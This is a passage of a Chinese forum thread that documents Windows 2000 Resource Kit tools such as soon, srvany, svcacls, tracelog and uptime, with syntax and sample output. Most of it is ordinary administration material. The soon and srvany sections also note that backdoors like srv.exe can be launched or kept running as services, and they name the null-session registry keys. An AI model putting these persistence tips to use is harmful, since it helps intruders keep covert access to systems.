以上就是2000的用户特权了，是不是很多呢？呵呵！ 

29. Sleep.exe （Batch File Wait） 

Sleep可以让计算机等待一段指定的时间。这个东东对于使用Batch文件会非常有用，在某些情况下也可能会让 

AT命令的使用更加方便。 

Sleep time 

time 
要暂停的时间，秒为单位。 

sleep 20 
在运行下一个程序之前等待20s。 

假设我们搞这么一个登陆脚本到计算机上，我想是个不错的主意。 

@echo off 

echo 2／23／2002 
echo. 
echo 不要忘了明天女朋友生日哦！！呵呵！ 

sleep 60 

30. Soon.exe （Near-Future Command Scheduler) 

soon这个命令可以让一个程序在很短的时间里面启动，比如几秒钟之内。基本上soon就是一个AT的装配命令， 

可以简单的装配一组合适AT命令来远程或者是本地启动一个程序。当然soon使用起来要比AT简单的多，自然功 

能也要少一些了。当然soon可以让一个命令在小于一天的时间内重复启动，这一点还是很有用的。下面介绍一下 

如何使用。 

soon有两种命令，一是普通的操作命令，还有就是配置命令。 

1. Scheduling Command 
soon \\computername delay /interactive "command" 

\\computername 
指定你要的计算机，远程使用时要net use。 

delay 
指定从现在开始到启动程序的间隔，以秒为单位，默认情况下是本地5s,远程15s。 

/interactive 
这个和AT命令里面的interactive是一样的。基本上可以看作是如果你打开一个cmd窗口，它会在桌面上跳出来 

。默认是off的。只有当Schedule服务以LocalSystem身份启动时才可以Interactive。 

command 
你想要执行的命令，这里用双引号来维持命令解释时候的空格。 

2. Configuration Command 

soon /d /l:n /r:n /i: on│off 

/d 
用这个开关来修改默认配置 

/l:n 
指定LocalDelay的值。 

/r:n 
指定RemoteDelay的值。 注意，这些值都是正整数，而且以秒为单位。 

/i:on│off 
指定默认情况下是interactive还是uninteractive。 

如果你想每5分钟启动一次一个程序可以写一个这样的脚本。 

every5.cmd 
soon 300 every5.cmd 
xxxx.exe 

对于远程启动时，使用AT命令不能成功的原因多数是因为AT命令需要指定绝对时间，如果不能搞得太清楚的话， 

我建议你们使用soon命令，在大部分情况下大家需要AT的功能，soon都可以完成，而且很快。基本上srv.exe 

这样的后门都可以用soon来做。 
另外不得不提一点，不知道是我的机器的关系还是这个程序本身的bug，很多情况下soon产生的schedule居然 

会是tomorrow，这个有点让人搞不懂。大家可以多试试。 

31. Srvany.exe （Applications as Services Utility） 

Srvany一个可以让Windows应用程序像一个服务那样运行。也就是说在logoff的时候不关闭，也不用在logon 

的时候重新启动。也就是就算是没有人登陆这个程序也可以运行，当然计算机得是开着的，呵呵！此外，如果这 

个应用程序不忽略WM_ENDSESSION或者CTRL_LOGOFF_EVENT时，程序也会因为logoff而退出。 

srvany是一个为32-bit应用程序设计的，但是用用16-bit也应该没有多大问题。如果你安装过srvany服务的 

话，在升级或安装Windows 2000, Windows NT Server, Windows NT Workstation, or applications 

时要先disabled。 

实际上srvany本身就是一个服务，它先把自己启动起来，然后又在启动那些配置过的应用程序。就我个人开来这 

种方法很费力，比起instsrv和srvinstw来说都比较难以使用，最关键的是还要手工添加注册表。下面也就说 

一下怎么样让一个应用程序像一个服务那样运行。 

首先我们要安装Srvany，可以使用instsrv Myservice c:\path\srvany.exe或者srvinstw照提示做就可 

以了。这个是必要的，我们需要Srvany来启动程序。 

当然为了让程序像服务一样运行，我们需要编辑注册表信息，而且还要选择启动参数和工作目录。这里再次提醒 

手工操作注册标有危险性，注意备份。 

我们只要在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MyService\下 
添加一个Parameters子键，这里的MyService是刚刚指定的Srvany的服务名字。 
然后再这个subkey底下建立一个应用程序入口，使用REG_SZ类型。 
接着在指定程序的全路径，需要包括扩展名。比如Application: REG_SZ: C:\Tools\srv.exe 

为了指定相应的启动参数我们还得继续编辑注册表。 
这个时候要在刚刚的Parameters底下接着创建一个AppParameters条目，也是REG_SZ类型。 
比如：AppParameters: REG_SZ: C:\tmp\example，当然因为srvany已经被安装为一个服务了，你也可以 

在Services面板里指定。C:\Tools\srv.exe C:\\temp\example。注意，这里使用\\来表示一个\。 

再来就是指定环境变量了。 
添加一个AppEnvironment，REG_MULTI_SZ类型。这个东西就是Services面板里面的Dependencies这一项。 

可以根据需要指定，没有就不需要添加。 

还要指定Working Directory。 
也是在Parameters里面建立一个AppDirectory使用REG_SZ。比如：AppDirectory: REG_SZ: C:\Tmp 
当然也可以在Services里面 /D c:\\tmp D:\\Tools\\Vi.exe c:\\tmp\\example。 

一个srvany可以启动一个应用程序，如果你要用srvany而且是多个程序的话，只要采用不同的servicename启 

动一个srvany就可以了。如果要删除可以使用instsrv myservice remove，也可以用sc。 

大家可以通过调整以下这几个注册表项来为提供相应的访问。 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ 
LanmanServer\Parameters\NullSessionShares 

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ 
LanmanServer\Parameters\NullSessionPipes 

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ 
LanmanServer\Parameters\RestrictNullSessAccess 

32. Srinstw.exe (Service Installation Wizard) 
这个安装服务的工具前面就已经提到过了，而且又是GUI工具，使用起来都照着提示做就可以了，这里就不再多 

说什么，只是注意卸载服务的时候不要把系统重要的服务赶掉就好了。 

33. Svcacls.exe （service ACL Editor） 

很可惜在这个版本的Reskit里面缺少了这个程序，非常遗憾不能对它进行测试。 

Svcacls是一个可以用来设置服务对象的ACL的命令行工具，基本上就是为了方便administrator进行委派控制 

而设立的。使用这个工具我们需要administrator特权，当然这个东西也是可以进行委派的。这里就提醒一点， 

不要删除任何服务的adminstrators和system许可，不然的话，你可能就要从装系统来恢复控制了。 

svcacls \\targetcomputer\Service Option 

\\targetcomputer\Service 
这个不用说了。 

Option有以下几种 

G(grant): trustee: Permissions 增加许可。 
S(Set): trustee: Permissions 重置许可。 
R(Revoke): trustee: 删除被赋予的explicit permissions。 
D(deny): trustee: 拒绝访问。注意，使用这个命令的时候要很小心，一旦你用了D:everyone，连 

administrators都没有权限来访问这个服务了。 

你可以在一行里面使用这些命令。比如： r:username g:uername:riu。 

trustee 
你要指定的用户。 

permissions 
相应的权限。 

有Specific许可和generic许可两种。 

Specific permissions: 

Q: Query Service Configuration (SERVICE_QUERY_CONFIG) 
S: Query Service Status (SERVICE_QUERY_STATUS) 
E: Enumerate Dependent Services (SERVICE_ENUMERATE_DEPENDENTS) 
C: Change Service Configuration (SERVICE_CHANGE_CONFIG) 
T: Start Service (SERVICE_START) 
O: Stop Service (SERVICE_STOP) 
P: Pause/Continue Service (SERVICE_PAUSE_CONTINUE) 
I: Interrogate Service with ControlService() (SERVICE_INTERROGATE) 
U: Allow User-Defined Control Commands (SERVICE_USER_DEFINED_CONTROL) 

Generic permissions: 

F: Full Control (SERVICE_ALL_ACCESS = QSECTOPIU) 
R: Generic Read (GENERIC_READ = QSE) 
W: Generic Write (GENERIC_WRITE = C) 
X: Generic Execute (GENERIC_EXECUTE = TOPIU) 

这个工具为我们提供了一种安全性的选择，禁止对某些服务的访问，可以避免一些攻击的发生。 

34. Svcmon.exe (service Monitoring Tool) 

这个工具可以用来监视本地或者是远程计算机服务的状态改变，当它发现一个服务开始或者是停止的时候，这个 

工具将会通过发e-mail或者是Exchange Server来通知你知道。 

这个工具由两部分组成，Svcmon.exe这个需要你手工拷贝到%SystemRoot%\System32底下，另一个Smconfig 

是一个安装向导。由于是图形界面，所以我就不再多说什么东西。这里提醒一下注意，在Exchange 

Recipients那里添如你要提醒的用户的Email。其他的按照指示做就可以了。 

35. Timethis.exe (Time This) 

我很喜欢这个工具，这个工具可以用来报告一个程序的运行时间。报告的时间可以详细到0.001s。连net sue都 

可以拿来测试。 
当然使用起来也很简单。 

timethis commandname 

当你在命令中有<, >, >>，｜这样的符号的时候，请使用双引号，比如：timethis "dir /a > a.txt" 

使用以后基本上会出来这么一个东西。 

C:\>timethis dir 

TimeThis : Command Line : dir 
TimeThis : Start Time : Sun Mar 03 17:45:27 2002 

Volume in drive C is WIN2000 
Volume Serial Number is 4CE5-8543 

Directory of C:\ 

2002-02-23 22:58 
Documents and Settings 
2002-02-23 22:49 
Inetpub 
2002-03-03 11:37 
Program Files 
2002-03-03 14:15 
WINNT 
0 File(s) 0 bytes 
4 Dir(s) 9,512,271,872 bytes free 

TimeThis : Command Line : dir 
TimeThis : Start Time : Sun Mar 03 17:45:27 2002 
TimeThis : End Time : Sun Mar 03 17:45:27 2002 
TimeThis : Elapsed Time : 00:00:00.050 

36. Timezone.exe (Daylight Saving Time Update Utility) 

微软真是奇怪，居然在ResKit里面加入了这样的东西，一个调整夏令时的工具。我们现在又不用夏令时，没有多 

大用处。随便说说！ 

timezone /g /s startdate enddate /？ 

/g 
当前的情况。 

/s startdate enddate 
进行修改，格式是Hour:DayofWeek:Day:Month 

Hour: 00-23 
DayofWeek: 0=Sunday 1=monday……… 
Day指定发生的时间，如果上面是sunday，这里是1的话，就是该月的第一个星期天。 
Month: 1 = January 到12 = December。 

37. Tlocmgr.exe (Telephony Location Manager) 

一个用来管理TAPI的小程序，允许你方便的改变你的TAPI Location。一旦运行以后会在右下角有一个tray， 

这个实在没有什么好说的。 

38. Tracedmp.exe (Trace Dump) 

这个工具也是用来处理Tracelog产生的日志的，和前面的Reducer.exe有相象之处。Tracelog产生的是不容易 

阅读的，我们可以使用Tracedmp把它转换比较容易读的格式，比如Summary.txt这种内容少一点, 也可以是 

CSV可以比较详细。还有tracedmp可以直接从Realtime buffer中直接读出数据来处理。tracedmp解释 

tracelog产生的日志是通过一个叫mofdata.guid的文件，这文件里面包含了系统的目录服务和系统追踪信息。 

如果要处理 其他的数据，必须把相应的信息加入到mofdata.guid中去。 

tracedmp option -h│-? 

-o filename 
输出CSV和summary文件，默认情况下是dumpfile.csv和summary.txt。这里的dumpfile.csv包括每一个 

event的详细的信息。具体产生的日志的内容代表的信息我在这里就不详细说了，大家可以参看相应的资料。 

-guid 
MOF定义文件，默认的GUID是mofdata.guid，你也可以进行指定。 

-rt 
产生一个real-time trace文件。如果要指定这个选项，tracelog必须是在工作的。 

-summary 
只提供summary.txt文件。 

一般像这样用就可以了，Tracedmp c:\logfile.etl。你当然也可以tracedmp -rt ds，来显示realtime记 

录。 

39. Traceenable.exe (Trace Enable) 

这是一个用来enable/disable RAS/RADIUS记录的GUI工具。这个工具允许我们修改 

HKLM\SOFTWARE\Microsoft\Tracing key下的 
EnableConsoleTracing 
EnableFileTracing 
MaxFileSize 
三个subkeys。如果你熟悉注册表的话，也可以直接修改。图形界面的工具就不多说了。 

提一下面板中的几个选项。 

Global 
enable console tracing 
允许你实时看目录。 

enable pool tagging 
打开system pool标记。 

Per Component 
enable console tracing 
在控制台窗口中显示日志跟踪信息。 

enable file tracing 
把信息保存到一个日志文件中。一般在%windir%\tracing。 

max file size 
文件的最大尺寸。 

如果你是在一台才安装的计算机中启用这个东东的话，有些键值会不在注册表中，那就是说在Trace Enable中 

也看不到，你需要先运行RasPhone。 

40. Tracelog.exe (Trace Log) 

说了半天终于说到这个tracelog.exe了。这个命令行工具可以开始，停止，启用跟踪记录，这些记录可以用 

Tracedmp或者是Reducer来看。tracelog在运行时将建立一个buffer，然后如果有数据进入buffer它可以把 

这些数据转换为文件保存，也可以进行实时的跟踪，这个时候我们可以用如tracedmp这样的应用程序读出 

buffer中的数据。 

tracelog managementoption bufferoption logfileoption Systemleveltracingoption 

Provider-specificOption -h│-? 

managementOption: Starting, stopping, updating and querying 

-guid file 
和tracedmp中的是一样的，都是表示provider的信息。如果开始System tracing可以不用提供Guid，如果是 

directory service events我们可以指定control.guid。 

-start logger_name 
开始一个trace会话。你要提供一个日志名字，如果是一个system trace可以不需要指定，默认的名字为“NT 

Kernel logger”。 

-stop logger_name 
终止trace会话。如果是system trace可以不用指定logger_name。 

-update option logger_name 
升级当前的trace会话。这个东西在你想改变文件的名字，buffer的参数，realtime模式等时候就会被用到。 
以下这些option可以在kernel logger中用到。 

-rt 
模式开关，调整realtime mode。 

-f logfile_name 
指定新的log文件的名字。 

-ft n 
改变buffer的刷新计数器。 

-max n 
改变buffer的大小。 

"-nodisk" "-noprocess" "-nothread" "-nonet" "-fio" "-pf" "-hf" "-img" "-cm" 
NT kernel logger的一些标志。 

上面这些调整可以一次进行，如：tracelog -update -rt -max 40。 

-x 
停止所有活动的会话。 

-l 
查询在工作的traces。 

-q 
只查询system trace。 

BufferOption 

-b n 
设置buffer的大小为n kb。小的buffer会导致经常刷新buffer，基本上使用默认就好。 

-min n 
设置最小buffer,默认是2。 

-max n 
设置最大buffer，默认是25。 

-ft n_seconds 
设置刷新时间。 

-age n_minutes 
修改老化时间。就是分配的buffer没有使用，会在多长时间内被释放。 

LogfileOption 

-rt b 
启用real time mode。 

-f name 
日志的名字。默认是c:\logfile.etl，如果要使用不同的名字用-o filename。 

-seq n_mbyte 
一直使用到n_mbyte。 

-cir n_mbyte 
循环使用n_mbyte。 


Systemleveltracingoption 
为kernel tracing提供更多的选项。 
默认情况下kernel tracing包括 
Process start/end 
Disk I/O 
Network TCP/IP, UDP/IP 
Thread start/end 

只有在使用一些开关后，才会产生下面的内容。 
Image Load 
Registry calls 
File I/O 
Page Fault 
但是trace这些东西会产生很大的负担。 

-fio 
启用file I/O tracing。 

-pf 
启用page faults tracing。 

-hf 
启用hard faults tracing。 

-img 
启用image load tracing。 

-um 
启用Process Private tracing。这种情况下buffer建立在Private Process space中，默认是在kernel 

space中。 

-nf 
每n mb更新文件。 

ProviderSpecificOption: Provider Level Options 

-level n 

-flags 

这些都和相应的provider有关。 

下面看个例子， 

打开trace。 
c:\>tracelog Cstart 
Logger Started... 
Operation Status: 0L 
The operation completed successfully. 

Logger Name: NT Kernel Logger 
Logger Id: ffff 
Logger Thread Id: 1360 
Buffer Size: 8 Kb 
Maximum Buffers: 25 
Minimum Buffers: 2 
Number of Buffers: 2 
Free Buffers: 1 
Buffers Written: 3 
Events Lost: 0 
Log Buffers Lost: 0 
Real Time Buffers Lost: 0 
Log File Mode: Sequential 
Enabled tracing: Process Thread Disk TcpIp 
Log Filename: C:\LogFile.Etl 

停止trace 
C:\>tracelog Cstop 
Operation Status: 0L 
The operation completed successfully. 

Logger Name: NT Kernel Logger 
Logger Id: ffff 
Logger Thread Id: 1360 
Buffer Size: 8 Kb 
Maximum Buffers: 25 
Minimum Buffers: 2 
Number of Buffers: 2 
Free Buffers: 2 
Buffers Written: 7 
Events Lost: 0 
Log Buffers Lost: 0 
Real Time Buffers Lost: 0 
Log File Mode: Sequential 
Log Filename: C:\LogFile.Etl 

收集和分析一个系统的各种信息对于管理员是日常工作中很重要的一块，使用合适的工具可以大大简化这样的工 

作负担。也许tracelog会是个很好的工具。 

41. Tzdit.exe (Time Zone Editor) 
这个工具可以用来改变Time zone记录，可以编辑现有的记录，也可以自己弄一个自己喜欢的时区出来，没有多 

大意思。需要管理员身份使用。一般来说大家都不会去改这种东西，而且又是个GUI工具，这里就不多说了。 

42. uptime.exe 

这个命令行工具可以通过分析event log来一台服务器的可靠性，有效性和当前的正常工作时间。目标系统可以 

是本地也可以是远程。显示的内容很多，比如该机器的关机，重起，系统故障，服务包安装等等内容，可以比较 

全面的判定一个系统的稳定情况。虽然这个程序对于privilege没有什么特别的要求，但是微软推荐大家以 

administrator（为了使用System Performance Counter来完成工作）的身份运行该程序。对于这个程序来 

说时区会对程序的计算造成一些影响，这个在分析远程主机的时候需要特别注意。 

uptime server /s /a /d:mm/dd/yyyy │/p:n /heartbeat /?│/help 

server 
要分析的主机的ip或者是name。本地可以不用指定。 

/s 
主要的系统事件和统计。 

/a 
显示应用程序失败时间。 

/d: 
计算mm/dd/yyyy以后的事件。 

/p:n 
计算先前n天的事件。 

/heartbeat 
打开或者是关闭heartbeat。 

为了能够正确的反映系统的状况，heartbeat需要被指定，heartbeat实际上就是一个time stamp会在一个固 

定的间隔（5分钟）内写到系统的注册表中。根据这个时间戳我们可以分析系统的稳定性，但是这个东西会影响 

到电源策略的使用，所以不推荐在Laptop中使用。启用heartbeat使用以下命令： 

uptime /heartbeat ［\\computer]。 

在Windows 2000 Server中这个是默认启用的，但是奇怪我使用这个命令的时候，我的Adanced Server竟然 

不支持system heartbeat，呵呵！这个东西本来是可以看出Stop Errors，也就是我们平常说的Blue 

Screens错误。但是我使用2000以后还真没有见过Blue Screen。可见2000还是很稳定的。 

下面举个例子： 

C:\>uptime 
\\HELLO has been up for: 0 day(s), 2 hour(s), 32 minute(s), 25 second(s) 


C:\>uptime /p:2 /s 
Uptime Report for: \\HELLO 


Time Zone: China Standard Time 

System Events as of 2002-3-3 20:06:38: 

Date: Time: Event: Comment: 
---------- ----------- ------------------- ----------------------------------- 

2002-3-1 0:11:33 Shutdown Prior uptime:0d 0h:17m:12s 
2002-3-1 11:41:03 Boot Prior downtime:0d 11h:29m:30s 
2002-3-1 13:07:21 Shutdown Prior uptime:0d 1h:26m:18s 
2002-3-1 17:20:18 Boot Prior downtime:0d 4h:12m:57s 
2002-3-1 18:23:27 Shutdown Prior uptime:0d 1h:3m:9s 
2002-3-1 18:25:39 Boot Prior downtime:0d 0h:2m:12s 
2002-3-1 18:27:17 Shutdown Prior uptime:0d 0h:1m:38s 
2002-3-1 18:53:14 Boot Prior downtime:0d 0h:25m:57s 
2002-3-1 19:03:54 Shutdown Prior uptime:0d 0h:10m:40s 
2002-3-1 19:47:41 Boot Prior downtime:0d 0h:43m:47s 
2002-3-1 20:51:02 Shutdown Prior uptime:0d 1h:3m:21s 
2002-3-1 20:52:07 Boot Prior downtime:0d 0h:1m:5s 
2002-3-1 22:13:20 Shutdown Prior uptime:0d 1h:21m:13s 
2002-3-1 22:14:24 Boot Prior downtime:0d 0h:1m:4s 
2002-3-1 22:15:38 Shutdown Prior uptime:0d 0h:1m:14s 
2002-3-1 22:16:41 Boot Prior downtime:0d 0h:1m:3s 
2002-3-1 22:18:22 Shutdown Prior uptime:0d 0h:1m:41s 
2002-3-1 22:19:27 Boot Prior downtime:0d 0h:1m:5s 
2002-3-1 23:28:31 Shutdown Prior uptime:0d 1h:9m:4s 
2002-3-2 9:12:03 Boot Prior downtime:0d 9h:43m:32s 
2002-3-2 12:02:48 Shutdown Prior uptime:0d 2h:50m:45s 
2002-3-2 12:03:52 Boot Prior downtime:0d 0h:1m:4s 
2002-3-2 12:11:18 Shutdown Prior uptime:0d 0h:7m:26s 
2002-3-2 16:42:54 Boot Prior downtime:0d 4h:31m:36s 
2002-3-2 19:50:04 Shutdown Prior uptime:0d 3h:7m:10s 
2002-3-2 19:51:35 Boot Prior downtime:0d 0h:1m:31s 
2002-3-3 0:06:38 Shutdown Prior uptime:0d 4h:15m:3s 
2002-3-3 8:28:09 Boot Prior downtime:0d 8h:21m:31s 
2002-3-3 10:16:30 Shutdown Prior uptime:0d 1h:48m:21s 
2002-3-3 10:17:32 Boot Prior downtime:0d 0h:1m:2s 
2002-3-3 14:26:48 Shutdown Prior uptime:0d 4h:9m:16s 
2002-3-3 17:01:51 Boot Prior downtime:0d 2h:35m:3s 
2002-3-3 17:23:22 Shutdown Prior uptime:0d 0h:21m:31s 
2002-3-3 17:24:20 Boot Prior downtime:0d 0h:0m:58s 
2002-3-3 17:32:23 Shutdown Prior uptime:0d 0h:8m:3s 
2002-3-3 17:33:22 Boot Prior downtime:0d 0h:0m:59s 

Current System Uptime: 0 day(s), 2 hour(s), 33 minute(s), 16 second(s) 

Estimate based on last boot record in the event log. 
See UPTIME /help for more detail. 

-------------------------------------------------------------------------------- 


Since 2002-3-1: (Last 2 Days) 

System Availability: 37.9457% 
Total Uptime: 1d 1h:50m:42s 
Total Downtime: 1d 18h:15m:56s 
Total Reboots: 18 
Mean Time Between Reboots: 0.16 days 
Total Bluescreens: 0 


Notes: 
There is insufficient data in the event log to calculate 
system availability. Please see UPTIME /help for more detail. 

基本上就是这样的。 

43. W2000msgs.chm (Windows 2000 Error and Event Messages Help) 

这个帮助文件列出了Win2k产生的绝大部分错误，也给出了相应的解释和纠正错误的方法。在这个文档里面也包括了部分应用程序和启动程序的错误，对这个有兴趣的人就仔细看看吧！内容挺多的。 

以上43个各型工具就算作是ResKit介绍的第一部分了，里面有几个工具对于大家来说是十分有用的。之所以没有把它们挑出来，是因为希望大家对所有的程序都看一下，即使记不住全部，但有一个印象要用到的时候就可以很快找到。最后，希望大家满意！！呵呵！因为写得比较仓促啦，肯定会有一些错误，希望大家提出来，让我加以改正。后面的东西会尽快更新


    



虚拟空间 论坛空间 域名注册
木木是做虚拟主机的,有需要请PM联系我,可以拿到优惠价格
注意:非站务合作购买相关事宜,请不要加小木QQ,因无时间回答众热心网友的问题  
      奖励 惩罚    

木木 
查看公开信息 
发短消息给 木木 
发送邮件给 木木 
访问 木木 的个人网站 
查找 木木 发表的更多帖子 
添加 木木 到好友列表 
木木的奖品 
 高尔夫 
 超人 
游戏中心 
在Arcade向 木木 挑战! 

 2003-01-28, 14:11    #3  
木木   
网盟站长


 


注册日期: Oct 2002
您的住址: 浙江
帖子: 3,258 
精华: 20
现金: 47333 金币
资产: 78136 金币
声望: 141 
  Resource Kit 第二部分 

--------------------------------------------------------------------------------

这一部分包括的类型很多，大家依照自己的喜好看！！ 

一、调试工具 

1. Ntdetect.com(Installd.cmd): Startup Hardware Detector 

在x86-based计算机里面，Win2000使用NTDetect来在启动的时候侦测系统中安装的各种硬件，并且显示这些 

传递给kernel的硬件信息结构。有些时候标准版的NTDetect.com会难以侦测到你想要的全部硬件，这个时候你 

就可以使用我面在这里介绍的这个版本的NTDetect，这是个一个Debug Version。它可以为您提供更多的诊断 

信息，也可以比较方便的分析出问题的所在。 

NTDetect可以显示如系统组件，总线，适配器组件，硬盘几何结构，ROM块，键盘，COM口，并口，鼠标以及磁 

盘驱动器的信息，还是挺多的吧！呵呵！这些东东显示完以后，在按个键你还可以接着显示 

HKEY_LOCAL_MACHINE\HARDWARE\Controllerx的内容。 

上面这些东西都完了以后，你还可以通过简单的按空格键来使用LastKnownGood控制设备来代替Current控制设 

备来启动系统。这个可以让系统用上一次的配置重新启动。 

Debug版的NTDetect安装起来很容易使用installd.cmd就可以，卸载的的时候可以用installd /not来。这 

个很容易。注意，如果NTDetect丢失的话，系统将不能正常启动，需要修复。所以，在使用这个工具的时候请 

大家慎重！！！ 


下面所说怎么安装，这个东西安装起来有点麻烦。主要是因为微软提供的这个安装程序有点问题，只能对 

Ntdetect.com进行备份，但是拷贝的时候不能正确进行，这样你会看到下面的提示： 

C:\>installd 
You must switch to the Resource Kit Directory/Folder to install the debug 
version of NTDETECT.COM. Press CTRL-C to exit out of setup or you may 
Press any key to continue . . . 
1 file(s) copied. 
The file cannot be copied onto itself. 
0 file(s) copied. <-------------------就在这里拷贝不能够正确进行。 
Debug NTDETECT installed successfully <--------但是installd仍会提示成功，faint! 
To un install, type INSTALLD /NOT 

下面你就看到了，installd只进行了备份，拷贝没有成功。这里要自己做。 

1999-12-07 12:00 34,468 ntdetect.000 
1999-12-07 12:00 34,468 NTDETECT.COM 

ntdetect.com在ResKit的目录中是ntdetect.chk，这个和帮助不符。还是要自己动手吧！接下来就copy, 

ren………，我这里就不详细说了。注意使用attrib修改一些属性。 

安装成功以后，重新启动计算机，你就可以看到Debug模式了，灰底黑字，太多东西，想看的人就自己去试一下 

。 

卸载的时候就使用install /not这个倒是没有什么问题，只要刚刚的备份在的话，程序就可以自动完成了。 

这里再介绍一种2000下观察系统启动过程的方法。这个很简单，只要在boot.ini的 
multi(0)disk(0)rdisk(0)partition(1)\WINNT="Microsoft Windows 2000 Advanced Server" 

/fastdetect 
后面添加一个/SOS（这里不能换行，要换了的话你就惨了！），下一次启动的时候，启动过程就会显示出来，这 

个对于系统排错很有帮助，而且这个过程可以自动完成，不像NTDetect.com这样还要自己去按键，大家根据自 

己的喜好使用吧！ 

2. WinNT 4.0 OEM Support Tools 

这些东西在ResKit的CD里面才有，网上这些版本里面都没有。主要是包括了NT4.0里面的一些诊断工具和开发工 

具。还是挺有用的，对现有的好多工具都有扩展，真是太可惜了，居然没有~~~~~~~~！ 

二. 部署工具 

1. Gpolmig.exe: Group Policy Migrationf 

这是一个可以用来将NT4.0的系统策略升级为2000 Group Policy Object结构的工具。但是由于系统策略在 

2000注册表中的位置发生了改变，所以这样的升级可能会对某些应用程序和组件无效。 

gpolmig policyfilepath /list /listgpo /migrate objecttype name GPO 

policyfilepath 
NT4.0 policy文件(.pol)的路径。 

/list 
显示NT4.0策略文件中的策略。 

/listgpo 
显示Group Policy object 

/migrate 
指定3个额外的参数。 

objecttype 
computer, user, group里面的一种。 

name 
策略文件中的对象的名字。 

GPO 
要升级的GPO的名字。 

因为没有NT4.0所以就没有进行实际的使用，有的同志可以帮忙做一下。 

2. Lbridge.cmd: L-Bridge 

L-Bridge这个批量脚本可以帮助管理员处理一些在Mixed-mode模式下目录服务复制的问题。 
在一个NT4.0域中，系统通常使用LMRepl来复制logon script本到所有的域控制器，但是2000却不支持 

LMRepl，AD使用FRS来自动，透明的复制位于sysvol到所有的域控制器上，当然logon script也包括在内。 

如果我们的域处于mixed-mode（既有NT4.0的域控制器，也有2000的域控制器）的情况时，它们之间的复制就 

有了问题。 

L-Bridge为2种不同的复制结构提供了一种“桥”，可以将2000 sysvol的文件移动到NT4.0 LMRepl的导出目录 

中。这可以保证这两种复制机制保持物理上的彼此分隔，不会导致任何过去的服务被引入到2000的域控制器中。 

L-Bridge实际上就是个拷贝脚本，如果你用文本编辑器打开L-Bridge.cmd就可以看到它实际上就是进行了一个 

Xcopy的工作。要是你熟悉2000的各种结构的话，也可以自己来进行这种拷贝的工作。 

同上面的原因一样，具体的操作这里就不列出了，有兴趣的人可以自己试试，但是这个应当在了解目录服务复制 

的基础上进行。 

3.Netset.exe 

一个用来配置网络参数的工具，基本上可以实现：列出目录，安装，配置，卸载网络组件。由于是使用的无人值 

守模式，所以很适合在多台计算机上部署Win2000的时候使用。当然用来恢复也是可行的。使用很简单： 

netset drive:\path\filename /display /? 

drive:\path\filename 
answer file的位置 

/display 
显示当前的网络服务和组件。 

关于answer文件的编写，由于相关的参数很多，在这个地方就不做详细的介绍，详细的情况请参见MCSE的教材 

或者是相应的2000的介绍文档。 


4. setupmgr.exe: Setup Manager 
Sysdiff.exe: Automated Installation tool 
SysPrep.exe 

setupmgr.exe（使用answer文件在多台计算机上部署Win2000），Sysdiff.exe（可以将要安装的应用程序 

作为自动安装的一部分），Sysprep.exe（可以理解为做克隆用的2000的程序）这几个程序都属于本身系统自 

带，且是MCSE的学习要求，相关的资料很多。所以做为Reskit的介绍，我就不打算谈这几个工具。具体要不要 

谈，可以根据大家的要求来定。 

5. Unattend.doc: Unattended Setup Parameters Guide 

一个关于如何编辑answer文件的官方文档。里面附带例子，对上面那几个程序感兴趣的人可以看看。 

6. Wmloadsimulator.exe: Windows Media Load Simulator 

ResKit里面尽是些奇奇怪怪的工具，我看这个就是一个。Wmloadsimulator全称Windows Media Load 

Simulator，这是一个用来模拟大量用户访问Windows Media Server的情况的工具。主要是用来衡量服务器 

处理请求的能力。 

这个工具并没有包括在Resource Kit的工具包里，而是放在了Reskit的光盘上。没有东东就没有办法说什么了 

。 

三. 桌面工具 

1. Chklnks.exe: Link Check Wizard 

看上去样子还不错的一个工具，可以用来检测你的系统里面有没有Dead Link（也就是一些没有实际关联的快捷 

方式），如果有的话，就提示你是不是要把它们干掉。 

图形界面用起来很简单，就不用我多说了，不要告诉我说你看不懂英文，呵呵！ 

2. Cmdhere.inf: Command Prompt Here 

我非常喜欢的一个东东，自从有了它我感觉Win2000好用多了，呵呵！ 

安装了这个Shell扩展可以让我们在右击一个文件夹的时候，多出一个CMD Prompt Here的选项，一旦点了它就 

会弹出一个居于这个路径的CMD会话，我想要这个东西好久了，终于被我在这里找到了！哈哈！ 

大家赶快用用吧！实在是强烈强烈强烈强烈强烈强烈强烈强烈强烈强烈推荐！！安装很简单，右击这个inf，选 

install就可以了。 

3. Seagate Software Crystal Report 6.0 

又是一个没有的工具，无法多说什么。反正就是一个Event Log Viewer工具，可能会多了一些功能吧！如果实 

在要要可以 http://www.seagatesoftware.com/crytalreports/找找看看，这是个third-pirty工具。 

4. Netcons.exe: Net Connections 

一个用来显示当前连接的GUI工具，照微软的说法来看，是想用来取代net use的显示功能。没有什么好说的点 

开就用了。没有什么可以设置的。 

5. Quickres.exe: Quick Resolution Changer 

这个东西就有点像powerstrip这样的显卡工具，和我的显卡工具差不多，可以通过这个工具快速改变当前的分 

辨率，颜色，刷新率的工具，打开这个工具以后会在右下角有个小图标，点就可以看见菜单了。 

6. Quiktray.exe 

这个东西非常有趣，有空我也会拿来用用。 

大家是不是一直觉得右下角那些tray很有意思，使用这个工具可以让我们自己定制自己的tray，包括的类型可 

以有可执行文件（*.exe, *.com, *.bat），各种类型的Office文件（*.doc, *.mdb, *.mpp, *.ppt, 

*.xls），配置文件（*.inf, *.ini, *.sys）<---我还真不知道把这些东西弄在那里有什么用，真有微软的 

，呵呵！一些网络文件（*.htm, *.html, *.jpg, *.gif）<---实际上也无所谓了你弄个asp也没有什么问题 

。文本文件也是行的，最后再说一句，你们可千万不用打我 ，这可说好了………，那我就说啦！其实你要添加个什 

么文件都是可以的，哈哈！ 

添加上面这些东西都很容易照着GUI上面的提示做就可以了，只是在添加URL的时候有一点点不同，你可以先把它 

拖到桌面上弄出一个shortcut在添加就可以了。另外，再说一个技巧，添加可以用直接拖动的方式，不用每次 

都按照ADD，然后……的步骤做。 

如果要让这些东西在启动的时候自动加载，请把Quiktray.exe的shortcut弄到Startup文件夹里面去。 

如果要在远程计算机上使用，我们可以用个编辑器创建一个Quiktray.dat文件，在里面是添加文件的路径，如 

果有网络路径请使用UNC路径名。到时候将这个文件拷到有Quiktray.exe的文件夹里面，当Quiktray.exe启动 

